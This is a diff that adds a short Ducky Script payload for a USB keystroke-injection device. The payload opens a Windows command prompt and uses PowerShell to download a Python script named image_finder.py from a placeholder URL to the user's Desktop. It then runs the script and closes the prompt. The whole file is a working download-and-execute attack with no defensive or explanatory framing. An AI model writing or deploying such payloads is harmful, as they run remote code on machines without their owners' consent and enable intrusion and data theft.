@@ -1,0 +1,21 @@
+REM Open command prompt
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM Download the Python script using PowerShell
+STRING powershell -command "Invoke-WebRequest -Uri 'YOUR_SCRIPT_URL' -OutFile '%USERPROFILE%\Desktop\image_finder.py'"
+ENTER
+DELAY 3000
+
+REM Execute the Python script
+STRING python %USERPROFILE%\Desktop\image_finder.py
+ENTER
+DELAY 500
+
+REM Close command prompt
+STRING exit
+ENTER
